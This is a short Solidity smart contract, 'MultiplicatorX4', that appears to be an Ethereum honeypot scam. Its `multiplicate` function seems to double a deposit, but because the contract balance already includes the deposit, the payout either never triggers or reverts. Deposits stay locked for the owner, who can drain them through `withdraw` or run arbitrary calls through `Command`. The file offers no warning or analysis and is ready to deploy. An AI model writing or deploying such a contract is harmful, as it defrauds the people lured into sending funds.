pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        if(msg.value >= this.balance) {
            require(adr.call.value(this.balance + msg.value)());
        }
    }
}